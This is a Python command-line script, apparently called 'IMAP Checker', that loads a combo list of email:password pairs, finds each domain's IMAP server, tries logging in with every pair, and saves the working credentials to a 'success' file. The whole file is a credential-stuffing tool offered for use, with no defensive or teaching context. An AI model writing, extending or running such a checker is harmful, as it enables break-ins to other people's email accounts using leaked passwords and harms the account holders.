import argparse
import os
import sys
from server import *
import re

parser = argparse.ArgumentParser(description="Command Line Version of IMAP Checker")

parser.add_argument('-i','--input', action='store', dest='input_file',help='File path containing the MAIL:PASS Combo')
parser.add_argument('-o','--output', action='store', dest='output_file',help='Writes success hits to file')
parser.add_argument('-v','--version', action='version', version='IMAP_Checker '+VERSION,help='Shows the Mail Checker version')

results = parser.parse_args()
input_file=results.input_file
output_file=results.output_file if results.output_file else "success.txt"
if os.path.isfile(input_file):
	print("[+]\tLoading "+input_file+" ...")
	input_stream = open(input_file, 'r')
	text = input_stream.read()
	input_stream.close()
	matches = re.findall(r"([a-z0-9]*@[a-z0-9]*\.[a-z]*):(.*)", text)
else:
	print("[-]\t"+input_file+" Not Found !!!")
	sys.exit()
print("[*]\t"+input_file+" Loaded !!!")
print("[+]\tStarting Scan...")
for mail,passw in matches:
	print("Trying: "+mail+":"+passw)
	server,port=search_server(mail.split('@')[1])
	if server and port:
		if imapCheck(mail,passw,server,port):
			f=open(output_file,'a')
			f.write(mail+":"+passw+"\n")
			f.close()
			print("\t[$]\t"+mail+":"+passw)
		else:
			print("[X]\t"+mail+":"+passw)
	else:
		print("[X] Bad Request")